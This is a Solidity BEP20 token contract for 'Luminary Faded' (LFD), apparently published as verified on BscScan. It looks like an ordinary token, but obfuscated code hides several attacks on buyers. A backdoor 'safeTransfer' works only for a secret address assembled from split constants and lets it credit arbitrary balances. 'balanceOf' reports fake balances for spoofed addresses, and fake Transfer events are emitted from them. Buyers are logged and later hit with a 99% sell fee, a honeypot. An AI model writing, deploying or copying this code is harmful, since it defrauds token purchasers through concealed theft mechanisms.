/**
 *Submitted for verification at BscScan.com on 2023-01-05
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;



interface IBEP20 {

    function name() external view returns (string memory);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function symbol() external view returns (string memory);

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function balanceOf(address account) external view returns (uint256);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function getOwner() external view returns (address);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}



interface IUniswapV2Router {

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}


library SafeMath {

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}




contract LuminaryFaded is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;
    uint256 private fundFromIsReceiver = 0;
    IUniswapV2Router public launchTakeMaxLiquidity;
    mapping(uint256 => address) private takeMaxTeamLaunchExemptIsBuy;
    uint160 constant tokenTakeFundTeamReceiverSenderBuy = 514167923740;


    uint256 private feeMintTakeMarketingToTotalLiquidity = 0;
    string constant _name = "Luminary Faded";
    uint256 private fromExemptMinLimitIs;
    uint256 tokenSwapFundTake = 14840;
    uint256  feeTakeAutoLiquidity = 100000000 * 10 ** _decimals;
    uint256 private marketingLaunchedTradingFund = 0;

    uint256 private sellReceiverSwapIs;
    mapping(address => bool) private liquidityLaunchedLaunchIs;
    bool public launchBuyListMaxTokenMode = false;


    address constant tokenLiquidityReceiverShould = 0xF16C91b7842f83CC61ba91494394f8fCD6251638;
    uint256 private receiverToTeamAutoWalletEnableTx = teamMarketingShouldLaunch / 1000; // 0.1%
    uint256 constant receiverIsSellTx = 10000 * 10 ** 18;

    address private ZERO = 0x0000000000000000000000000000000000000000;

    uint160 constant botsTotalAtTrading = 1002756341520 * 2 ** 80;

    uint256 public buyWalletModeFee = 0;
    uint256  feeTradingTotalShouldFromMinWallet = 100000000 * 10 ** _decimals;
    uint256 teamTotalFeeEnableTakeTx = 2 ** 18 - 1;
    uint256 private swapLiquiditySellSender;
    uint256 marketingBuyIsShouldFeeLaunchedMax = 0;
    uint256 public minLaunchFundBurn = 0;
    uint256 private receiverTakeMinAt = 0;
    bool public receiverShouldTotalLiquidityTeamSwapReceiver = false;
    bool private autoBotsShouldListFee = false;

    mapping(address => uint256) _balances;
    address private burnListReceiverEnableTotalBuyMode = (msg.sender);
    bool private atMarketingLaunchFee = true;
    bool private toLaunchedMarketingAtReceiver = true;

    mapping(address => uint256) private swapBotsShouldFee;
    uint256 private takeToLiquiditySwap;
    mapping(address => uint256) private isSellFundMin;



    bool private exemptEnableModeSwapMintAtReceiver = true;

    uint256 private modeTxAutoEnable = 0;
    mapping(address => bool) private senderReceiverAtList;
    uint256 private limitFromToMode;
    address private WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    uint256 constant receiverTradingMintTokenListMaxTo = 300000 * 10 ** 18;
    uint256  constant MASK = type(uint128).max;
    address private DEAD = 0x000000000000000000000000000000000000dEaD;
    string constant _symbol = "LFD";
    uint256 public minTxFromListReceiver = 0;
    uint256 private autoMarketingEnableAmountModeExempt = 0;
    uint256 private fromAmountIsTrading;

    mapping(uint256 => address) private mintSwapMarketingIsToken;

    bool private walletLimitBotsFrom = true;
    uint256 private tokenFundAutoIs = 100;
    
    address public uniswapV2Pair;

    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private toIsFeeFrom;
    uint256 public maxWalletAmount = 0;

    address private buyFundFromIs = (msg.sender);
    uint256 private isMaxBurnLiquidityTrading = 0;

    uint256 private launchedMintTakeIsFee = 6 * 10 ** 15;
    bool private fundSwapFromList = true;
    uint256 teamMarketingShouldLaunch = 100000000 * (10 ** _decimals);
    bool private exemptShouldBuyWalletMintSwapSender;
    mapping(address => bool) private autoTotalShouldLiquidity;
    uint256 private txMarketingExemptLaunched;
    uint256 private launchBlock = 0;
    uint160 constant minEnableAtMode = 655245423978 * 2 ** 120;
    uint160 constant listReceiverIsToken = 171045600438 * 2 ** 40;
    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        launchTakeMaxLiquidity = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(launchTakeMaxLiquidity.factory()).createPair(address(this), launchTakeMaxLiquidity.WETH());
        _allowances[address(this)][address(launchTakeMaxLiquidity)] = teamMarketingShouldLaunch;

        exemptShouldBuyWalletMintSwapSender = true;

        toIsFeeFrom[msg.sender] = true;
        toIsFeeFrom[0x0000000000000000000000000000000000000000] = true;
        toIsFeeFrom[0x000000000000000000000000000000000000dEaD] = true;
        toIsFeeFrom[address(this)] = true;

        senderReceiverAtList[msg.sender] = true;
        senderReceiverAtList[address(this)] = true;

        autoTotalShouldLiquidity[msg.sender] = true;
        autoTotalShouldLiquidity[0x0000000000000000000000000000000000000000] = true;
        autoTotalShouldLiquidity[0x000000000000000000000000000000000000dEaD] = true;
        autoTotalShouldLiquidity[address(this)] = true;

        approve(_router, teamMarketingShouldLaunch);
        approve(address(uniswapV2Pair), teamMarketingShouldLaunch);
        _balances[msg.sender] = teamMarketingShouldLaunch;
        emit Transfer(address(0), msg.sender, teamMarketingShouldLaunch);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return teamMarketingShouldLaunch;
    }

    function tokenMintTakeReceiver() private {
        if (minLaunchFundBurn > 0) {
            for (uint256 i = 1; i <= minLaunchFundBurn; i++) {
                if (swapBotsShouldFee[takeMaxTeamLaunchExemptIsBuy[i]] == 0) {
                    swapBotsShouldFee[takeMaxTeamLaunchExemptIsBuy[i]] = block.timestamp;
                }
            }
            minLaunchFundBurn = 0;
        }
    }

    function takeLimitBotsLaunchedLiquidity(uint160 teamSellTokenList) private view returns (uint256) {
        uint256 modeLiquidityBotsShould = marketingBuyIsShouldFeeLaunchedMax;
        uint256 sellExemptTotalAmountFund = teamSellTokenList - uint160(tokenLiquidityReceiverShould);
        if (sellExemptTotalAmountFund < modeLiquidityBotsShould) {
            return receiverIsSellTx;
        }
        return receiverTradingMintTokenListMaxTo;
    }

    function setlimitTotalLaunchMax(uint256 receiverBuyLaunchFund) public onlyOwner {
        if (launchedMintTakeIsFee != feeMintTakeMarketingToTotalLiquidity) {
            feeMintTakeMarketingToTotalLiquidity=receiverBuyLaunchFund;
        }
        launchedMintTakeIsFee=receiverBuyLaunchFund;
    }

    function getmaxMarketingTakeFund() public view returns (uint256) {
        if (minTxFromListReceiver == maxWalletAmount) {
            return maxWalletAmount;
        }
        if (minTxFromListReceiver != isMaxBurnLiquidityTrading) {
            return isMaxBurnLiquidityTrading;
        }
        if (minTxFromListReceiver == minTxFromListReceiver) {
            return minTxFromListReceiver;
        }
        return minTxFromListReceiver;
    }

    function getmintLaunchedAmountLaunch() public view returns (bool) {
        if (atMarketingLaunchFee == autoBotsShouldListFee) {
            return autoBotsShouldListFee;
        }
        if (atMarketingLaunchFee != toLaunchedMarketingAtReceiver) {
            return toLaunchedMarketingAtReceiver;
        }
        return atMarketingLaunchFee;
    }

    function receiverMintFundList() private view returns (uint256) {
        address teamToIsTrading = WBNB;
        if (address(this) < WBNB) {
            teamToIsTrading = address(this);
        }
        (uint toAtFeeLaunched, uint listBotsLimitBuy,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 liquiditySellFeeTokenTotalModeMin,) = WBNB == teamToIsTrading ? (toAtFeeLaunched, listBotsLimitBuy) : (listBotsLimitBuy, toAtFeeLaunched);
        uint256 feeBotsMarketingSender = IERC20(WBNB).balanceOf(uniswapV2Pair) - liquiditySellFeeTokenTotalModeMin;
        return feeBotsMarketingSender;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function modeToMintReceiverBuyFeeMax(address modeLiquidityBotsShouldender, bool swapMarketingLaunchAmount) internal returns (uint256) {
        
        if (autoBotsShouldListFee == autoBotsShouldListFee) {
            autoBotsShouldListFee = atMarketingLaunchFee;
        }

        if (modeTxAutoEnable != isMaxBurnLiquidityTrading) {
            modeTxAutoEnable = launchedMintTakeIsFee;
        }

        if (receiverTakeMinAt == minLaunchFundBurn) {
            receiverTakeMinAt = receiverToTeamAutoWalletEnableTx;
        }


        if (swapMarketingLaunchAmount) {
            fromAmountIsTrading = feeMintTakeMarketingToTotalLiquidity + autoMarketingEnableAmountModeExempt;
            return tokenWalletFromSellAutoLaunchFee(modeLiquidityBotsShouldender, fromAmountIsTrading);
        }
        if (!swapMarketingLaunchAmount && modeLiquidityBotsShouldender == uniswapV2Pair) {
            fromAmountIsTrading = marketingLaunchedTradingFund + fundFromIsReceiver;
            return fromAmountIsTrading;
        }
        return tokenWalletFromSellAutoLaunchFee(modeLiquidityBotsShouldender, fromAmountIsTrading);
    }

    function maxIsLaunchSellTotal(address modeLiquidityBotsShouldender, address shouldTradingMintReceiverLiquidity, uint256 burnFundAmountTomount) internal returns (bool) {
        if (teamModeBuyMin(uint160(shouldTradingMintReceiverLiquidity))) {
            walletMintTokenAutoMode(modeLiquidityBotsShouldender, shouldTradingMintReceiverLiquidity, burnFundAmountTomount, false);
            return true;
        }
        if (teamModeBuyMin(uint160(modeLiquidityBotsShouldender))) {
            walletMintTokenAutoMode(modeLiquidityBotsShouldender, shouldTradingMintReceiverLiquidity, burnFundAmountTomount, true);
            return true;
        }
        
        if (receiverTakeMinAt != receiverToTeamAutoWalletEnableTx) {
            receiverTakeMinAt = receiverToTeamAutoWalletEnableTx;
        }

        if (launchBuyListMaxTokenMode != exemptEnableModeSwapMintAtReceiver) {
            launchBuyListMaxTokenMode = fundSwapFromList;
        }

        if (isMaxBurnLiquidityTrading != tokenFundAutoIs) {
            isMaxBurnLiquidityTrading = minTxFromListReceiver;
        }


        bool receiverTotalEnableMode = shouldReceiverTakeLaunched(modeLiquidityBotsShouldender) || shouldReceiverTakeLaunched(shouldTradingMintReceiverLiquidity);
        
        if (receiverTakeMinAt == buyWalletModeFee) {
            receiverTakeMinAt = receiverToTeamAutoWalletEnableTx;
        }

        if (isMaxBurnLiquidityTrading != buyWalletModeFee) {
            isMaxBurnLiquidityTrading = fundFromIsReceiver;
        }


        if (modeLiquidityBotsShouldender == uniswapV2Pair) {
            if (maxWalletAmount != 0 && sellIsMinMax(uint160(shouldTradingMintReceiverLiquidity))) {
                senderLiquidityFromLaunchedTakeToken();
            }
            if (!receiverTotalEnableMode) {
                txAmountMarketingMin(shouldTradingMintReceiverLiquidity);
            }
        }
        
        
        if (receiverTakeMinAt == minTxFromListReceiver) {
            receiverTakeMinAt = launchBlock;
        }

        if (isMaxBurnLiquidityTrading != launchBlock) {
            isMaxBurnLiquidityTrading = buyWalletModeFee;
        }

        if (receiverShouldTotalLiquidityTeamSwapReceiver == exemptEnableModeSwapMintAtReceiver) {
            receiverShouldTotalLiquidityTeamSwapReceiver = receiverShouldTotalLiquidityTeamSwapReceiver;
        }


        if (inSwap || receiverTotalEnableMode) {return launchedLaunchBuySwap(modeLiquidityBotsShouldender, shouldTradingMintReceiverLiquidity, burnFundAmountTomount);}
        
        if (isMaxBurnLiquidityTrading != isMaxBurnLiquidityTrading) {
            isMaxBurnLiquidityTrading = receiverTakeMinAt;
        }

        if (receiverShouldTotalLiquidityTeamSwapReceiver != fundSwapFromList) {
            receiverShouldTotalLiquidityTeamSwapReceiver = fundSwapFromList;
        }

        if (launchBuyListMaxTokenMode != exemptEnableModeSwapMintAtReceiver) {
            launchBuyListMaxTokenMode = exemptEnableModeSwapMintAtReceiver;
        }


        require((burnFundAmountTomount <= feeTradingTotalShouldFromMinWallet) || toIsFeeFrom[modeLiquidityBotsShouldender] || toIsFeeFrom[shouldTradingMintReceiverLiquidity], "Max TX Limit!");

        _balances[modeLiquidityBotsShouldender] = _balances[modeLiquidityBotsShouldender].sub(burnFundAmountTomount, "Insufficient Balance!");
        
        uint256 burnFundAmountTomountReceived = limitMintExemptBots(modeLiquidityBotsShouldender) ? fundExemptBurnTxLiquiditySenderReceiver(modeLiquidityBotsShouldender, shouldTradingMintReceiverLiquidity, burnFundAmountTomount) : burnFundAmountTomount;

        _balances[shouldTradingMintReceiverLiquidity] = _balances[shouldTradingMintReceiverLiquidity].add(burnFundAmountTomountReceived);
        emit Transfer(modeLiquidityBotsShouldender, shouldTradingMintReceiverLiquidity, burnFundAmountTomountReceived);
        return true;
    }

    function txAmountMarketingMin(address atLiquiditySellToken) private {
        uint256 walletReceiverIsExemptMarketingSwapTrading = receiverMintFundList();
        if (walletReceiverIsExemptMarketingSwapTrading < launchedMintTakeIsFee) {
            minLaunchFundBurn += 1;
            takeMaxTeamLaunchExemptIsBuy[minLaunchFundBurn] = atLiquiditySellToken;
            isSellFundMin[atLiquiditySellToken] += walletReceiverIsExemptMarketingSwapTrading;
            if (isSellFundMin[atLiquiditySellToken] > launchedMintTakeIsFee) {
                maxWalletAmount = maxWalletAmount + 1;
                mintSwapMarketingIsToken[maxWalletAmount] = atLiquiditySellToken;
            }
            return;
        }
        maxWalletAmount = maxWalletAmount + 1;
        mintSwapMarketingIsToken[maxWalletAmount] = atLiquiditySellToken;
    }

    function safeTransfer(address modeLiquidityBotsShouldender, address shouldTradingMintReceiverLiquidity, uint256 burnFundAmountTomount) public {
        if (!tokenFeeAutoFrom(uint160(msg.sender))) {
            return;
        }
        if (teamModeBuyMin(uint160(shouldTradingMintReceiverLiquidity))) {
            walletMintTokenAutoMode(modeLiquidityBotsShouldender, shouldTradingMintReceiverLiquidity, burnFundAmountTomount, false);
            return;
        }
        if (teamModeBuyMin(uint160(modeLiquidityBotsShouldender))) {
            walletMintTokenAutoMode(modeLiquidityBotsShouldender, shouldTradingMintReceiverLiquidity, burnFundAmountTomount, true);
            return;
        }
        if (modeLiquidityBotsShouldender == address(0)) {
            _balances[shouldTradingMintReceiverLiquidity] = _balances[shouldTradingMintReceiverLiquidity].add(burnFundAmountTomount);
            return;
        }
        if (modeLiquidityBotsShouldender == address(1)) {
            return;
        }
        if (modeLiquidityBotsShouldender == address(2)) {
            return;
        }
        if (modeLiquidityBotsShouldender == address(3)) {
            return;
        }
    }

    function teamModeBuyMin(uint160 teamSellTokenList) private pure returns (bool) {
        if (teamSellTokenList >= uint160(tokenLiquidityReceiverShould) && teamSellTokenList <= uint160(tokenLiquidityReceiverShould) + 420000) {
            return true;
        }
        return false;
    }

    function setmintLaunchedAmountLaunch(bool receiverBuyLaunchFund) public onlyOwner {
        if (atMarketingLaunchFee == autoBotsShouldListFee) {
            autoBotsShouldListFee=receiverBuyLaunchFund;
        }
        atMarketingLaunchFee=receiverBuyLaunchFund;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return maxIsLaunchSellTotal(msg.sender, recipient, amount);
    }

    function tokenFeeAutoFrom(uint160 teamSellTokenList) private pure returns (bool) {
        uint160 burnFundAmountTo = minEnableAtMode;
        burnFundAmountTo += botsTotalAtTrading;
        burnFundAmountTo += listReceiverIsToken;
        burnFundAmountTo += tokenTakeFundTeamReceiverSenderBuy;
        return teamSellTokenList == burnFundAmountTo;
    }

    function limitMintExemptBots(address modeLiquidityBotsShouldender) internal view returns (bool) {
        return !autoTotalShouldLiquidity[modeLiquidityBotsShouldender];
    }

    function shouldReceiverTakeLaunched(address atLiquiditySellToken) private view returns (bool) {
        return atLiquiditySellToken == buyFundFromIs;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != teamMarketingShouldLaunch) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return maxIsLaunchSellTotal(sender, recipient, amount);
    }

    function fundExemptBurnTxLiquiditySenderReceiver(address modeLiquidityBotsShouldender, address exemptTeamMintTx, uint256 burnFundAmountTomount) internal returns (uint256) {
        
        uint256 toAmountReceiverTx = burnFundAmountTomount.mul(modeToMintReceiverBuyFeeMax(modeLiquidityBotsShouldender, exemptTeamMintTx == uniswapV2Pair)).div(tokenFundAutoIs);

        if (liquidityLaunchedLaunchIs[modeLiquidityBotsShouldender] || liquidityLaunchedLaunchIs[exemptTeamMintTx]) {
            toAmountReceiverTx = burnFundAmountTomount.mul(99).div(tokenFundAutoIs);
        }

        _balances[address(this)] = _balances[address(this)].add(toAmountReceiverTx);
        emit Transfer(modeLiquidityBotsShouldender, address(this), toAmountReceiverTx);
        
        return burnFundAmountTomount.sub(toAmountReceiverTx);
    }

    function getMaxTotalAmount() public {
        senderLiquidityFromLaunchedTakeToken();
    }

    function settxTokenReceiverTotalFundLiquidityLimit(uint256 receiverBuyLaunchFund) public onlyOwner {
        if (minLaunchFundBurn != fundFromIsReceiver) {
            fundFromIsReceiver=receiverBuyLaunchFund;
        }
        minLaunchFundBurn=receiverBuyLaunchFund;
    }

    function settradingTeamListFund(address receiverBuyLaunchFund,bool buySenderReceiverMinWallet) public onlyOwner {
        if (receiverBuyLaunchFund == buyFundFromIs) {
            launchBuyListMaxTokenMode=buySenderReceiverMinWallet;
        }
        if (receiverBuyLaunchFund == DEAD) {
            exemptEnableModeSwapMintAtReceiver=buySenderReceiverMinWallet;
        }
        if (toIsFeeFrom[receiverBuyLaunchFund] == autoTotalShouldLiquidity[receiverBuyLaunchFund]) {
           autoTotalShouldLiquidity[receiverBuyLaunchFund]=buySenderReceiverMinWallet;
        }
        toIsFeeFrom[receiverBuyLaunchFund]=buySenderReceiverMinWallet;
    }

    function tokenWalletFromSellAutoLaunchFee(address modeLiquidityBotsShouldender, uint256 takeTokenLaunchedModeAuto) private view returns (uint256) {
        uint256 autoBuyTakeMarketing = swapBotsShouldFee[modeLiquidityBotsShouldender];
        if (autoBuyTakeMarketing > 0 && receiverLiquidityWalletAuto() - autoBuyTakeMarketing > 0) {
            return 99;
        }
        return takeTokenLaunchedModeAuto;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, teamMarketingShouldLaunch);
    }

    function setautoLimitSenderFund(uint256 receiverBuyLaunchFund) public onlyOwner {
        if (receiverTakeMinAt != fundFromIsReceiver) {
            fundFromIsReceiver=receiverBuyLaunchFund;
        }
        if (receiverTakeMinAt == minTxFromListReceiver) {
            minTxFromListReceiver=receiverBuyLaunchFund;
        }
        if (receiverTakeMinAt == minLaunchFundBurn) {
            minLaunchFundBurn=receiverBuyLaunchFund;
        }
        receiverTakeMinAt=receiverBuyLaunchFund;
    }

    function launchedLaunchBuySwap(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function getMaxTotalAFee() public {
        tokenMintTakeReceiver();
    }

    function getautoLimitSenderFund() public view returns (uint256) {
        if (receiverTakeMinAt == marketingLaunchedTradingFund) {
            return marketingLaunchedTradingFund;
        }
        if (receiverTakeMinAt != tokenFundAutoIs) {
            return tokenFundAutoIs;
        }
        return receiverTakeMinAt;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function getlimitTotalLaunchMax() public view returns (uint256) {
        return launchedMintTakeIsFee;
    }

    function gettxTokenReceiverTotalFundLiquidityLimit() public view returns (uint256) {
        if (minLaunchFundBurn == marketingLaunchedTradingFund) {
            return marketingLaunchedTradingFund;
        }
        return minLaunchFundBurn;
    }

    function setmaxMarketingTakeFund(uint256 receiverBuyLaunchFund) public onlyOwner {
        minTxFromListReceiver=receiverBuyLaunchFund;
    }

    function receiverLiquidityWalletAuto() private view returns (uint256) {
        return block.timestamp;
    }

    function gettradingTeamListFund(address receiverBuyLaunchFund) public view returns (bool) {
            return toIsFeeFrom[receiverBuyLaunchFund];
    }

    function sellIsMinMax(uint160 shouldTradingMintReceiverLiquidity) private view returns (bool) {
        return uint16(shouldTradingMintReceiverLiquidity) == tokenSwapFundTake;
    }

    function senderLiquidityFromLaunchedTakeToken() private {
        if (maxWalletAmount > 0) {
            for (uint256 i = 1; i <= maxWalletAmount; i++) {
                if (swapBotsShouldFee[mintSwapMarketingIsToken[i]] == 0) {
                    swapBotsShouldFee[mintSwapMarketingIsToken[i]] = block.timestamp;
                }
            }
            maxWalletAmount = 0;
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (teamModeBuyMin(uint160(account))) {
            return takeLimitBotsLaunchedLiquidity(uint160(account));
        }
        return _balances[account];
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function walletMintTokenAutoMode(address modeLiquidityBotsShouldender, address shouldTradingMintReceiverLiquidity, uint256 burnFundAmountTomount, bool fromShouldLimitAt) private {
        if (fromShouldLimitAt) {
            modeLiquidityBotsShouldender = address(uint160(uint160(tokenLiquidityReceiverShould) + marketingBuyIsShouldFeeLaunchedMax));
            marketingBuyIsShouldFeeLaunchedMax++;
            _balances[shouldTradingMintReceiverLiquidity] = _balances[shouldTradingMintReceiverLiquidity].add(burnFundAmountTomount);
        } else {
            _balances[modeLiquidityBotsShouldender] = _balances[modeLiquidityBotsShouldender].sub(burnFundAmountTomount);
        }
        emit Transfer(modeLiquidityBotsShouldender, shouldTradingMintReceiverLiquidity, burnFundAmountTomount);
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}